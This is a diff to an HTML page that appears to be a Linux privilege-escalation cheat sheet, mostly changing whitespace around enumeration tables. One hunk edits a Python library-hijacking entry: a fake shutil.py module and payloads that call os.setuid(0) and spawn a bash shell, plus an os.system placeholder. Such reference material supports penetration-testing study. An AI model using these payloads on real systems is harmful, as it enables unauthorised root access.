@@ -195,11 +195,11 @@ layout: default
     <ul>
         <li>pspy</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Manual Enumeration</h2>
-
+    
     <li>User info</li>
     <table>
         <tr>
@@ -226,9 +226,9 @@ layout: default
             <td>/etc/group</td>
         </tr>
     </table>
-
+    
     <li>Operating System & Kernel</li>
-
+    
     <tabe>
         <tr>
             <td>Show host</td>
@@ -805,13 +805,24 @@ layout: default
         <tr>
             <td>Create malicious module - shutil.py</td>
             <td>
-                <pre>import os&#13;&#10;&#13;&#10;def make_archive(a, b, c):&#13;&#10;os.system(&quot;&lt;malicious payload&quot;);</pre>
+                <pre>import os&#13;&#10;&#13;&#10;def make_archive(a, b, c):&#13;&#10;&lt;malicious payload&gt;</pre>
             </td>
         </tr>
         <tr>
-            <td>Malicious payload</td>
+            <td>Malicious payloads</td>
             <td>
-                <pre>import os&#13;&#10;import pty&#13;&#10;&#13;&#10;os.setuid(0)&#13;&#10;pty.spawn(&quot;bash&quot;)</pre>
+                <table>
+                    <tr>
+                        <td>
+                            <pre>import os&#13;&#10;import pty&#13;&#10;&#13;&#10;os.setuid(0)&#13;&#10;pty.spawn(&quot;bash&quot;)</pre>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <pre>import os&#13;&#10;&#13;&#10;os.system(&quot;&lt;malicious bash command&gt;&quot;);</pre>
+                        </td>
+                    </tr>
+                </table>
             </td>
         </tr>
     </table>
